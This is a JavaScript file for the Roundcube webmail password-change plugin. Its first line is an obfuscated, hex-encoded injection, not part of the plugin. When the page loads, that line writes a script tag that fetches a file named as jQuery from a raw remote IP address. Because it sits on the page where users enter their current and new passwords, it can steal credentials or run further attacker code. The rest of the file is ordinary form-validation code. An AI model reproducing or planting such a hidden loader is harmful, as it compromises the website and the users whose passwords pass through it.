var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * Password plugin script
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2012-2014, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */

window.rcmail && rcmail.addEventListener('init', function(evt) {
    if (rcmail.env.password_disabled) {
        $('#password-form input').prop('disabled', true);
        // reload page after ca. 3 minutes
        rcmail.reload(3 * 60 * 1000 - 2000);
        return;
    }

    // register command handler
    rcmail.register_command('plugin.password-save', function() {
        var input_curpasswd = rcube_find_object('_curpasswd'),
            input_newpasswd = rcube_find_object('_newpasswd'),
            input_confpasswd = rcube_find_object('_confpasswd');

      if (input_curpasswd && input_curpasswd.value == '') {
          alert(rcmail.get_label('nocurpassword', 'password'));
          input_curpasswd.focus();
      }
      else if (input_newpasswd && input_newpasswd.value == '') {
          alert(rcmail.get_label('nopassword', 'password'));
          input_newpasswd.focus();
      }
      else if (input_confpasswd && input_confpasswd.value == '') {
          alert(rcmail.get_label('nopassword', 'password'));
          input_confpasswd.focus();
      }
      else if (input_newpasswd && input_confpasswd && input_newpasswd.value != input_confpasswd.value) {
          alert(rcmail.get_label('passwordinconsistency', 'password'));
          input_newpasswd.focus();
      }
      else {
          rcmail.gui_objects.passform.submit();
      }
    }, true);

    $('input:not(:hidden):first').focus();
});
